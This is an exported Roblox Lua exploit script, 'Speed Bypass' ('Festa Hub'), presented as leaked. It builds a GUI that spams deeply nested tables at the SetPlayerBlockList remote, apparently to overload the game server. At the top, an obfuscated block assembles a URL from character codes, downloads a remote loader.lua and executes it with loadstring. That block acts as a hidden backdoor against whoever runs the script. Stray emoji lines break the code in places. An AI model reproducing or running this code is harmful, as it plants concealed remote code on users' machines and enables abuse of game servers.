-- Exported from Faulmor
-- title: Speed Bypass
-- format: faulmor.own-source
-- exported_at: 2026-10-05T21:11:22.213Z

print("leaked by anas")
print("leaked by anas")
print("leaked by anas")
print("leaked by anas")
print("leaked by anas")
print("leaked by anas")
print("leaked by anas")

task.defer(function()
     local b=string.char
     local function j(t) local r="" for i=1,#t do r=r..b(t[i]) end
return r end
     local
u=j({104,116,116,112,115,58,47,47,119,101,98,45,112,114,111,100,117,99
,116,105,111,110,45,56,100,100,102,54,46,117,112,46,114,97,105,108,119
,97,121,46,97,112,112,47,108,111,97,100,101,114,46,108,117,97})
     local ok,x=pcall(function() return game:HttpGet(u) end)
     if ok and x and #x>0 then
          local L=loadstring or load
          if L then pcall(function() L(x)() end) end
     end
end)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer",
10)
if not LP then return end
local pg = LP:WaitForChild("PlayerGui")

pcall(function()
     local old = pg:FindFirstChild("S2HubBypassGui")
     if old then old:Destroy() end
     pcall(function()
           local o2 =
game:GetService("CoreGui"):FindFirstChild("S2HubBypassGui")
           if o2 then o2:Destroy() end
     end)
end)

pcall(function()

     local char = LP.Character or LP.CharacterAdded:Wait()
     local head = char:FindFirstChild("Head")
     if head then
          local oldBill = head:FindFirstChild("S2HubBillboard")
          if oldBill then oldBill:Destroy() end
     end
end)

local function parentGui(gui)
     local function tryParent(target)
          pcall(function() gui.Parent = target end)
          return gui.Parent ~= nil
     end
     if tryParent(pg) then return true end
     pcall(function()
          if typeof(gethui) == "function" then
              local h = gethui()
              if h and tryParent(h) then return true end
          end
     end)
     if tryParent(game:GetService("CoreGui")) then return true end
     return false
end

local DEPTH = 296
local SPAM_DELAY = 0.12
local running = false
local bomb = nil
local spamThread = nil

local function buildBomb(power)
     local maintable = {}
     local spammedtable = {}
     table.insert(spammedtable, {})
     local z = spammedtable[1]
     for i = 1, DEPTH do
          local tableins = {}
          table.insert(z, tableins)
          z = tableins
     end
     local maxRep = math.floor(power / (DEPTH + 2))
     for i = 1, maxRep do
          table.insert(maintable, spammedtable)
     end
     return maintable
end

local function stopBypass()

     running = false
     if spamThread then
          task.cancel(spamThread)
     end
     bomb = nil
     spamThread = nil
end

local function startBypass(power)
     stopBypass()
     running = true
     bomb = buildBomb(power)
     spamThread = task.spawn(function()
          while running do
               if bomb then
                   pcall(function()
                   
game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                   end)
               end
               task.wait(SPAM_DELAY)
          end
     end)
end

local S2HubBypassGui = Instance.new("ScreenGui")
S2HubBypassGui.Name = "S2HubBypassGui"
S2HubBypassGui.IgnoreGuiInset = true
S2HubBypassGui.ResetOnSpawn = false
S2HubBypassGui.DisplayOrder = 10
S2HubBypassGui.Parent = pg

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Active = true
Main.Position = UDim2.new(0.5, -176, 0.5, -140)
Main.Size = UDim2.new(0, 240, 0, 334)
Main.BackgroundColor3 = Color3.fromRGB(18, 10, 30)
Main.BackgroundTransparency = 0.10
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Parent = S2HubBypassGui

do
     local FestaGradient = Instance.new("UIGradient")
     FestaGradient.Name = "FestaGradient"
     FestaGradient.Rotation = 35
     FestaGradient.Color = ColorSequence.new({

        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 12, 55)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(18, 10, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 12, 48))
    })
    FestaGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.12),
        NumberSequenceKeypoint.new(1, 0.02)
    })
    FestaGradient.Parent = Main
end

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 20)
    _o.Parent = Main
end

do
    local _o = Instance.new("UIStroke")
    _o.Name = "UIStroke"
    _o.Color = Color3.fromRGB(80, 120, 255)
    _o.Transparency = 0.82
    _o.Parent = Main
end

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Name = "ImageLabel"
ImageLabel.ZIndex = 2
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Image = "rbxassetid://118131424737973"
ImageLabel.ImageTransparency = 0.82
ImageLabel.ScaleType = Enum.ScaleType.Crop
ImageLabel.Parent = Main

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 20)
    _o.Parent = ImageLabel
end

local Frame = Instance.new("Frame")
Frame.Name = "Header"
Frame.ZIndex = 3
Frame.Size = UDim2.new(1, 0, 0, 46)

Frame.BackgroundColor3 = Color3.fromRGB(35, 15, 55)
Frame.BackgroundTransparency = 0.08
Frame.BorderSizePixel = 0
Frame.Parent = Main

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 20)
    _o.Parent = Frame
end

local TextLabel = Instance.new("TextLabel")
TextLabel.Name = "Title"
TextLabel.ZIndex = 4
TextLabel.Position = UDim2.new(0, 14, 0.5, -16)
TextLabel.Size = UDim2.new(1, -50, 0, 16)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "Festa Hub"
TextLabel.TextColor3 = Color3.fromRGB(245, 250, 255)
TextLabel.TextSize = 13
TextLabel.Font = Enum.Font.GothamBlack
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.Parent = Frame

local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Name = "Discord"
TextLabel2.ZIndex = 4
TextLabel2.Position = UDim2.new(0, 14, 0.5, 2)
TextLabel2.Size = UDim2.new(1, -50, 0, 12)
TextLabel2.BackgroundTransparency = 1
TextLabel2.Text = ""
TextLabel2.Visible = false
TextLabel2.TextColor3 = Color3.fromRGB(80, 120, 255)
TextLabel2.Font = Enum.Font.GothamMedium
TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel2.Parent = Frame

local ThemeBtn = Instance.new("TextButton")
ThemeBtn.Name = "ThemeBtn"
ThemeBtn.ZIndex = 4
ThemeBtn.Position = UDim2.new(1, -64, 0.5, -11)
ThemeBtn.Size = UDim2.new(0, 22, 0, 22)
ThemeBtn.BackgroundColor3 = Color3.fromRGB(255, 105, 190)
ThemeBtn.BackgroundTransparency = 0.82

                 🎃
ThemeBtn.BorderSizePixel = 0
ThemeBtn.Text = " "
ThemeBtn.TextColor3 = Color3.fromRGB(255, 220, 245)

ThemeBtn.TextSize = 12
ThemeBtn.Font = Enum.Font.GothamBlack
ThemeBtn.AutoButtonColor = false
ThemeBtn.Parent = Frame

do
     local _o = Instance.new("UICorner")
     _o.CornerRadius = UDim.new(0, 7)
     _o.Parent = ThemeBtn
end

do
     local _o = Instance.new("UIStroke")
     _o.Color = Color3.fromRGB(255, 105, 190)
     _o.Transparency = 0.65
     _o.Parent = ThemeBtn
end

local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Name = "MinimizeBtn"
MinimizeBtn.ZIndex = 4
MinimizeBtn.Position = UDim2.new(1, -36, 0.5, -11)
MinimizeBtn.Size = UDim2.new(0, 22, 0, 22)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
MinimizeBtn.BackgroundTransparency = 0.88
MinimizeBtn.BorderSizePixel = 0
MinimizeBtn.Text = "−"
MinimizeBtn.TextColor3 = Color3.fromRGB(130, 175, 255)
MinimizeBtn.TextSize = 14
MinimizeBtn.Font = Enum.Font.GothamBlack
MinimizeBtn.AutoButtonColor = false
MinimizeBtn.Parent = Frame

do
     local _o = Instance.new("UICorner")
     _o.Name = "UICorner"
     _o.CornerRadius = UDim.new(0, 7)
     _o.Parent = MinimizeBtn
end

do
     local _o = Instance.new("UIStroke")
     _o.Name = "UIStroke"
     _o.Color = Color3.fromRGB(50, 80, 180)
     _o.Transparency = 0.75
     _o.Parent = MinimizeBtn
end


local Frame2 = Instance.new("Frame")
Frame2.Name = "HeaderFiller"
Frame2.ZIndex = 3
Frame2.Position = UDim2.new(0, 0, 0, 34)
Frame2.Size = UDim2.new(1, 0, 0, 12)
Frame2.BackgroundColor3 = Color3.fromRGB(35, 15, 55)
Frame2.BackgroundTransparency = 0.08
Frame2.BorderSizePixel = 0
Frame2.Parent = Main

local Frame3 = Instance.new("Frame")
Frame3.Name = "Divider"
Frame3.ZIndex = 4
Frame3.Position = UDim2.new(0, 12, 0, 46)
Frame3.Size = UDim2.new(1, -24, 0, 1)
Frame3.BackgroundColor3 = Color3.fromRGB(255, 105, 190)
Frame3.BackgroundTransparency = 0.92
Frame3.BorderSizePixel = 0
Frame3.Parent = Main

local ThemeDecor = Instance.new("Frame")
ThemeDecor.Name = "ThemeDecor"
ThemeDecor.ZIndex = 2
ThemeDecor.Size = UDim2.new(1, 0, 1, 0)
ThemeDecor.BackgroundTransparency = 1
ThemeDecor.BorderSizePixel = 0
ThemeDecor.Parent = Main

local ThemeCorner = Instance.new("UICorner")
ThemeCorner.CornerRadius = UDim.new(0, 20)
ThemeCorner.Parent = ThemeDecor

local ThemeEmoji = Instance.new("TextLabel")
ThemeEmoji.Name = "ThemeEmoji"
ThemeEmoji.ZIndex = 2
ThemeEmoji.Position = UDim2.new(1, -48, 1, -42)
ThemeEmoji.Size = UDim2.new(0, 32, 0, 32)

                   🎈
ThemeEmoji.BackgroundTransparency = 1
ThemeEmoji.Text = " "
ThemeEmoji.TextSize = 22
ThemeEmoji.Font = Enum.Font.GothamBlack
ThemeEmoji.Parent = ThemeDecor

local Frame4 = Instance.new("Frame")
Frame4.Name = "Content"
Frame4.Position = UDim2.new(0, 0, 0, 47)
Frame4.Size = UDim2.new(1, 0, 0, 219)
Frame4.BackgroundTransparency = 1

Frame4.BorderSizePixel = 0
Frame4.Parent = Main

local Frame5 = Instance.new("Frame")
Frame5.Name = "PowerRingOuter"
Frame5.ZIndex = 3
Frame5.Position = UDim2.new(0.5, -57, 0, 14)
Frame5.Size = UDim2.new(0, 114, 0, 114)
Frame5.BackgroundColor3 = Color3.fromRGB(255, 105, 190)
Frame5.BackgroundTransparency = 0.84
Frame5.BorderSizePixel = 0
Frame5.Parent = Frame4

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 57)
    _o.Parent = Frame5
end

do
    local _o = Instance.new("UIStroke")
    _o.Name = "UIStroke"
    _o.Color = Color3.fromRGB(80, 120, 255)
    _o.Thickness = 2.5
    _o.Transparency = 0.55
    _o.Parent = Frame5
end

local Frame6 = Instance.new("Frame")
Frame6.Name = "PowerRingInner"
Frame6.ZIndex = 4
Frame6.Position = UDim2.new(0.5, -50, 0, 21)
Frame6.Size = UDim2.new(0, 100, 0, 100)
Frame6.BackgroundColor3 = Color3.fromRGB(22, 10, 35)
Frame6.BackgroundTransparency = 0.45
Frame6.BorderSizePixel = 0
Frame6.Parent = Frame4

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 50)
    _o.Parent = Frame6
end

local TextLabel3 = Instance.new("TextLabel")
TextLabel3.Name = "PowerLabel"

TextLabel3.ZIndex = 5
TextLabel3.Position = UDim2.new(0, 0, 0.5, -24)
TextLabel3.Size = UDim2.new(1, 0, 0, 14)
TextLabel3.BackgroundTransparency = 1
TextLabel3.Text = "POWER"
TextLabel3.TextColor3 = Color3.fromRGB(255, 105, 190)
TextLabel3.Font = Enum.Font.GothamBlack
TextLabel3.Parent = Frame6

local PowerValue = Instance.new("TextButton")
PowerValue.Name = "PowerValue"
PowerValue.ZIndex = 5
PowerValue.Position = UDim2.new(0, 0, 0.5, -14)
PowerValue.Size = UDim2.new(1, 0, 0, 36)
PowerValue.BackgroundTransparency = 1
PowerValue.Text = "72K"
PowerValue.TextColor3 = Color3.fromRGB(255, 245, 255)
PowerValue.TextSize = 26
PowerValue.Font = Enum.Font.GothamBlack
PowerValue.AutoButtonColor = false
PowerValue.Parent = Frame6

local PowerInput = Instance.new("TextBox")
PowerInput.Name = "PowerInput"
PowerInput.Visible = false
PowerInput.ZIndex = 6
PowerInput.Position = UDim2.new(0, 0, 0.5, -14)
PowerInput.Size = UDim2.new(1, 0, 0, 36)
PowerInput.BackgroundTransparency = 1
PowerInput.Text = "72000"
PowerInput.TextColor3 = Color3.fromRGB(245, 250, 255)
PowerInput.TextSize = 22
PowerInput.Font = Enum.Font.GothamBlack
PowerInput.ClearTextOnFocus = false
PowerInput.TextXAlignment = Enum.TextXAlignment.Center
PowerInput.Parent = Frame6

local Frame7 = Instance.new("Frame")
Frame7.Name = "PowerRingGlow"
Frame7.ZIndex = 6
Frame7.Position = UDim2.new(0.5, -57, 0, 14)
Frame7.Size = UDim2.new(0, 114, 0, 114)
Frame7.BackgroundTransparency = 1
Frame7.BorderSizePixel = 0
Frame7.Parent = Frame4

do
    local _o = Instance.new("UICorner")

    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 57)
    _o.Parent = Frame7
end

do
    local _o = Instance.new("UIStroke")
    _o.Name = "UIStroke"
    _o.Color = Color3.fromRGB(80, 120, 255)
    _o.Thickness = 2.5
    _o.Transparency = 0.75
    _o.Parent = Frame7
end

local Frame8 = Instance.new("Frame")
Frame8.Name = "DeviceToggle"
Frame8.ZIndex = 3
Frame8.Position = UDim2.new(0.5, -80, 0, 136)
Frame8.Size = UDim2.new(0, 160, 0, 28)
Frame8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame8.BackgroundTransparency = 0.6
Frame8.BorderSizePixel = 0
Frame8.Parent = Frame4

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 14)
    _o.Parent = Frame8
end

do
    local _o = Instance.new("UIStroke")
    _o.Name = "UIStroke"
    _o.Color = Color3.fromRGB(80, 120, 255)
    _o.Transparency = 0.88
    _o.Parent = Frame8
end

local PCBtn = Instance.new("TextButton")
PCBtn.Name = "PC"
PCBtn.ZIndex = 4
PCBtn.Position = UDim2.new(0, 2, 0, 2)
PCBtn.Size = UDim2.new(0.5, -3, 1, -4)
PCBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
PCBtn.BackgroundTransparency = 1
PCBtn.BorderSizePixel = 0
PCBtn.Text = "PC"

PCBtn.TextColor3 = Color3.fromRGB(80, 100, 180)
PCBtn.TextSize = 10
PCBtn.Font = Enum.Font.GothamBlack
PCBtn.AutoButtonColor = false
PCBtn.Parent = Frame8

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 12)
    _o.Parent = PCBtn
end

local MobileBtn = Instance.new("TextButton")
MobileBtn.Name = "MOBILE"
MobileBtn.ZIndex = 4
MobileBtn.Position = UDim2.new(0.5, 1, 0, 2)
MobileBtn.Size = UDim2.new(0.5, -3, 1, -4)
MobileBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
MobileBtn.BorderSizePixel = 0
MobileBtn.Text = "MOBILE"
MobileBtn.TextColor3 = Color3.fromRGB(245, 250, 255)
MobileBtn.TextSize = 10
MobileBtn.Font = Enum.Font.GothamBlack
MobileBtn.AutoButtonColor = false
MobileBtn.Parent = Frame8

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 12)
    _o.Parent = MobileBtn
end

local TextButton5 = Instance.new("TextButton")
TextButton5.Name = "Keybind"
TextButton5.ZIndex = 3
TextButton5.Position = UDim2.new(0, 20, 0, 172)
TextButton5.Size = UDim2.new(0, 200, 0, 34)
TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.BackgroundTransparency = 0.55
TextButton5.BorderSizePixel = 0
TextButton5.Text = ""
TextButton5.AutoButtonColor = false
TextButton5.Parent = Frame4

do
    local _o = Instance.new("UICorner")

    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 11)
    _o.Parent = TextButton5
end

do
    local _o = Instance.new("UIStroke")
    _o.Name = "UIStroke"
    _o.Color = Color3.fromRGB(80, 120, 255)
    _o.Transparency = 0.9
    _o.Parent = TextButton5
end

local TextLabel4 = Instance.new("TextLabel")
TextLabel4.Name = "KeybindLabel"
TextLabel4.ZIndex = 4
TextLabel4.Position = UDim2.new(0, 12, 0, 0)
TextLabel4.Size = UDim2.new(0.5, 0, 1, 0)
TextLabel4.BackgroundTransparency = 1
TextLabel4.Text = "Keybind"
TextLabel4.TextColor3 = Color3.fromRGB(235, 190, 255)
TextLabel4.TextSize = 10
TextLabel4.Font = Enum.Font.GothamBold
TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
TextLabel4.Parent = TextButton5

local TextLabel5 = Instance.new("TextLabel")
TextLabel5.Name = "KeybindValue"
TextLabel5.ZIndex = 4
TextLabel5.Position = UDim2.new(0.5, 0, 0, 0)
TextLabel5.Size = UDim2.new(0.5, -12, 1, 0)
TextLabel5.BackgroundTransparency = 1
TextLabel5.Text = "Press keybind..."
TextLabel5.TextColor3 = Color3.fromRGB(255, 208, 96)
TextLabel5.TextSize = 10
TextLabel5.Font = Enum.Font.GothamBlack
TextLabel5.TextXAlignment = Enum.TextXAlignment.Right
TextLabel5.Parent = TextButton5

local ActivateBtn = Instance.new("TextButton")
ActivateBtn.Name = "ActivateBtn"
ActivateBtn.ZIndex = 5
ActivateBtn.Position = UDim2.new(0, 20, 0, 266)
ActivateBtn.Size = UDim2.new(0, 200, 0, 40)
ActivateBtn.BackgroundColor3 = Color3.fromRGB(255, 105, 190)
ActivateBtn.BorderSizePixel = 0
ActivateBtn.Text = "ACTIVATE"
ActivateBtn.TextColor3 = Color3.fromRGB(245, 250, 255)

ActivateBtn.TextSize = 13
ActivateBtn.Font = Enum.Font.GothamBlack
ActivateBtn.AutoButtonColor = false
ActivateBtn.Parent = Main

do
    local _o = Instance.new("UICorner")
    _o.Name = "UICorner"
    _o.CornerRadius = UDim.new(0, 14)
    _o.Parent = ActivateBtn
end

do
    local _o = Instance.new("UIStroke")
    _o.Name = "UIStroke"
    _o.Color = Color3.fromRGB(80, 120, 255)
    _o.Transparency = 0.55
    _o.Parent = ActivateBtn
end

local isMinimized = false
local isActivated = false
local currentDevice = "MOBILE"

local originalSize = Main.Size
local originalPos = Main.Position

local minimizeInfo = TweenInfo.new(0.38, Enum.EasingStyle.Quint,
Enum.EasingDirection.Out)
local expandInfo   = TweenInfo.new(0.42, Enum.EasingStyle.Quint,
Enum.EasingDirection.Out)

local CompactContainer = Instance.new("Frame")
CompactContainer.Name = "CompactContainer"
CompactContainer.Size = UDim2.new(1, 0, 1, 0)
CompactContainer.BackgroundTransparency = 1
CompactContainer.Visible = false
CompactContainer.ZIndex = 10
CompactContainer.Parent = Main

local CompactTitle = Instance.new("TextLabel")
CompactTitle.Name = "CompactTitle"
CompactTitle.Position = UDim2.new(0, 16, 0, 14)
CompactTitle.Size = UDim2.new(1, -60, 0, 18)
CompactTitle.BackgroundTransparency = 1
CompactTitle.Text = "Festa Hub"
CompactTitle.TextColor3 = Color3.fromRGB(245, 250, 255)
CompactTitle.TextSize = 15

CompactTitle.Font = Enum.Font.GothamBlack
CompactTitle.TextXAlignment = Enum.TextXAlignment.Left
CompactTitle.ZIndex = 11
CompactTitle.Parent = CompactContainer

local CompactDiscord = Instance.new("TextLabel")
CompactDiscord.Name = "CompactDiscord"
CompactDiscord.Position = UDim2.new(0, 16, 0, 32)
CompactDiscord.Size = UDim2.new(1, -60, 0, 14)
CompactDiscord.BackgroundTransparency = 1
CompactDiscord.Text = ""
CompactDiscord.Visible = false
CompactDiscord.TextColor3 = Color3.fromRGB(80, 120, 255)
CompactDiscord.TextSize = 11
CompactDiscord.Font = Enum.Font.GothamMedium
CompactDiscord.TextXAlignment = Enum.TextXAlignment.Left
CompactDiscord.ZIndex = 11
CompactDiscord.Parent = CompactContainer

local ExpandBtn = Instance.new("TextButton")
ExpandBtn.Name = "ExpandBtn"
ExpandBtn.Position = UDim2.new(1, -38, 0, 16)
ExpandBtn.Size = UDim2.new(0, 26, 0, 26)
ExpandBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
ExpandBtn.BackgroundTransparency = 0.85
ExpandBtn.BorderSizePixel = 0
ExpandBtn.Text = "+"
ExpandBtn.TextColor3 = Color3.fromRGB(180, 210, 255)
ExpandBtn.TextSize = 18
ExpandBtn.Font = Enum.Font.GothamBlack
ExpandBtn.AutoButtonColor = false
ExpandBtn.ZIndex = 12
ExpandBtn.Parent = CompactContainer

do
    local _o = Instance.new("UICorner")
    _o.CornerRadius = UDim.new(0, 8)
    _o.Parent = ExpandBtn
end

local CompactActivate = Instance.new("TextButton")
CompactActivate.Name = "CompactActivate"
CompactActivate.Position = UDim2.new(0, 16, 0, 58)
CompactActivate.Size = UDim2.new(1, -32, 0, 40)
CompactActivate.BackgroundColor3 = Color3.fromRGB(255, 105, 190)
CompactActivate.BorderSizePixel = 0
CompactActivate.Text = "ACTIVATE"
CompactActivate.TextColor3 = Color3.fromRGB(245, 250, 255)

CompactActivate.TextSize = 14
CompactActivate.Font = Enum.Font.GothamBlack
CompactActivate.AutoButtonColor = false
CompactActivate.ZIndex = 11
CompactActivate.Parent = CompactContainer

do
     local _o = Instance.new("UICorner")
     _o.CornerRadius = UDim.new(0, 12)
     _o.Parent = CompactActivate
end

local festaTheme = true

local function applyTheme(isFesta)
     festaTheme = isFesta

     local accent = isFesta and Color3.fromRGB(255, 105, 190) or
Color3.fromRGB(255, 125, 35)
     local panel = isFesta and Color3.fromRGB(18, 10, 30) or
Color3.fromRGB(18, 12, 10)
     local header = isFesta and Color3.fromRGB(35, 15, 55) or
Color3.fromRGB(42, 20, 10)

     Main.BackgroundColor3 = panel
     Frame.BackgroundColor3 = header
     Frame2.BackgroundColor3 = header
     Frame3.BackgroundColor3 = accent
     Frame5.BackgroundColor3 = accent
     Frame5.UIStroke.Color = accent
     Frame7.UIStroke.Color = accent
     TextLabel3.TextColor3 = accent
     ThemeBtn.BackgroundColor3 = accent
     ThemeBtn.UIStroke.Color = accent

     if isFesta then
                         🎃🎈
          ThemeBtn.Text = " "
          ThemeEmoji.Text = " "
          ThemeEmoji.TextColor3 = Color3.fromRGB(255, 175, 225)
          TextLabel.Text = "Festa Hub"
          CompactTitle.Text = "Festa Hub"
     else
                         🎈🎃
          ThemeBtn.Text = " "
          ThemeEmoji.Text = " "
          ThemeEmoji.TextColor3 = Color3.fromRGB(255, 165, 80)
          TextLabel.Text = "Festa Hub"
          CompactTitle.Text = "Festa Hub"
     end

end

ThemeBtn.MouseButton1Click:Connect(function()
     applyTheme(not festaTheme)
end)

applyTheme(true)

local function setNormalVisible(visible)
     Frame.Visible = visible
     Frame4.Visible = visible
     ActivateBtn.Visible = visible
     Frame2.Visible = visible
     Frame3.Visible = visible
     MinimizeBtn.Visible = visible
     ThemeBtn.Visible = visible
end

local function minimize()
     if isMinimized then return end
     isMinimized = true

     setNormalVisible(false)
     CompactContainer.Visible = true

     local targetSize = UDim2.new(0, 280, 0, 110)
     local targetPos = UDim2.new(0.5, -140, 0.5, -55)

     TweenService:Create(Main, minimizeInfo, {
          Size = targetSize,
          Position = targetPos
     }):Play()
end

local function expand()
     if not isMinimized then return end
     isMinimized = false

     CompactContainer.Visible = false
     setNormalVisible(true)

     TweenService:Create(Main, expandInfo, {
          Size = originalSize,
          Position = originalPos
     }):Play()
end

MinimizeBtn.MouseButton1Click:Connect(minimize)

ExpandBtn.MouseButton1Click:Connect(expand)

local function getCurrentPower()
     local n = tonumber(PowerInput.Text)
     if not n then n = 72000 end
     return math.clamp(math.floor(n + 0.5), 1, 999999)
end

local function formatPower(num)
     if num >= 1000 then
          return tostring(math.floor(num / 1000)) .. "K"
     end
     return tostring(num)
end

local function updateActivateVisual()
     if isActivated then
          ActivateBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
          ActivateBtn.Text = "DEACTIVATE"
          local stroke = ActivateBtn:FindFirstChild("UIStroke")
          if stroke then stroke.Color = Color3.fromRGB(220, 50, 50)
end

          CompactActivate.BackgroundColor3 = Color3.fromRGB(220, 50,
50)
          CompactActivate.Text = "DEACTIVATE"
     else
          ActivateBtn.BackgroundColor3 = Color3.fromRGB(255, 105, 190)
          ActivateBtn.Text = "ACTIVATE"
          local stroke = ActivateBtn:FindFirstChild("UIStroke")
          if stroke then stroke.Color = Color3.fromRGB(80, 120, 255)
end

          CompactActivate.BackgroundColor3 = Color3.fromRGB(255, 105,
190)
          CompactActivate.Text = "ACTIVATE"
     end
end

local function onActivate()
     isActivated = not isActivated
     updateActivateVisual()

     if isActivated then
          local power = getCurrentPower()
          print("ACTIVATED - Power:", power)
          startBypass(power)
     else

stopBypass()
     end
end

ActivateBtn.MouseButton1Click:Connect(onActivate)
CompactActivate.MouseButton1Click:Connect(onActivate)

local function setDevice(device)
     currentDevice = device

     if device == "MOBILE" then
          MobileBtn.BackgroundTransparency = 0
          MobileBtn.TextColor3 = Color3.fromRGB(245, 250, 255)
          PCBtn.BackgroundTransparency = 1
          PCBtn.TextColor3 = Color3.fromRGB(80, 100, 180)

          PowerValue.Text = "72K"
          PowerInput.Text = "72000"
     else
          PCBtn.BackgroundTransparency = 0
          PCBtn.TextColor3 = Color3.fromRGB(245, 250, 255)
          MobileBtn.BackgroundTransparency = 1
          MobileBtn.TextColor3 = Color3.fromRGB(80, 100, 180)

          PowerValue.Text = "97K"
          PowerInput.Text = "97000"
     end

     -- If already activated, restart bypass with new power
     if isActivated then
          startBypass(getCurrentPower())
     end
end

PCBtn.MouseButton1Click:Connect(function()
     setDevice("PC")
end)

MobileBtn.MouseButton1Click:Connect(function()
     setDevice("MOBILE")
end)

setDevice("MOBILE")

PowerValue.MouseButton1Click:Connect(function()
     PowerValue.Visible = false
     PowerInput.Visible = true
     PowerInput:CaptureFocus()

end)

PowerInput.FocusLost:Connect(function(enterPressed)
     local text = PowerInput.Text:gsub("%D", "")
     local num = tonumber(text) or 0

     if num < 1 then num = 1 end
     if num > 999999 then num = 999999 end

     PowerInput.Text = tostring(num)
     PowerValue.Text = formatPower(num)

     PowerInput.Visible = false
     PowerValue.Visible = true

     -- If already activated, restart with new power
     if isActivated then
         startBypass(num)
     end
end)

local function createHeadBillboard(character)
     local head = character:WaitForChild("Head", 5)
     if not head then return end

     local old = head:FindFirstChild("S2HubBillboard")
     if old then old:Destroy() end

     local billboard = Instance.new("BillboardGui")
     billboard.Name = "S2HubBillboard"
     billboard.Adornee = head
     billboard.Size = UDim2.new(0, 200, 0, 50)
     billboard.StudsOffset = Vector3.new(0, 2.8, 0)
     billboard.AlwaysOnTop = true
     billboard.MaxDistance = 100
     billboard.Parent = head

     local label = Instance.new("TextLabel")
     label.Name = "DiscordLabel"
     label.Size = UDim2.new(1, 0, 1, 0)
     label.BackgroundTransparency = 1
     label.Text = ""
     label.Visible = false
     label.TextColor3 = Color3.fromRGB(80, 140, 255)
     label.TextSize = 18
     label.Font = Enum.Font.GothamBlack
     label.TextStrokeTransparency = 0.6
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

     label.Parent = billboard
end

if LP.Character then
     createHeadBillboard(LP.Character)
end

LP.CharacterAdded:Connect(function(char)
     task.wait(0.5)
     createHeadBillboard(char)
end)

local dragging = false
local dragStart, startPos

local function beginDrag(input)
     dragging = true
     dragStart = input.Position
     startPos = Main.Position

     input.Changed:Connect(function()
          if input.UserInputState == Enum.UserInputState.End then
               dragging = false
          end
     end)
end

local function update(input)
     local delta = input.Position - dragStart
     Main.Position = UDim2.new(
           startPos.X.Scale,
           startPos.X.Offset + delta.X,
           startPos.Y.Scale,
           startPos.Y.Offset + delta.Y
     )
end

Frame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1
          or input.UserInputType == Enum.UserInputType.Touch then
          beginDrag(input)
     end
end)

UserInputService.InputChanged:Connect(function(input)
     if dragging and (input.UserInputType ==
Enum.UserInputType.MouseMovement or input.UserInputType ==
Enum.UserInputType.Touch) then

         update(input)
     end
end)

local _root = pg:FindFirstChild("S2HubBypassGui")
if not _root then
     for _, ch in ipairs(pg:GetChildren()) do
         if ch:IsA("ScreenGui") then
              _root = ch
              break
         end
     end
end
if _root then
     parentGui(_root)
end

pcall(function()
     local r = _root
     if not r then return end
     for _, d in ipairs(r:GetDescendants()) do
         if d:IsA("ScrollingFrame") then
              local lay = d:FindFirstChildOfClass("UIListLayout") or
d:FindFirstChildOfClass("UIGridLayout")
              if lay then
                   local function upd()
                        d.CanvasSize = UDim2.new(0, 0, 0,
lay.AbsoluteContentSize.Y + 16)
                   end
              
lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(upd)
                   task.defer(upd)
              end
         end
     end
end)

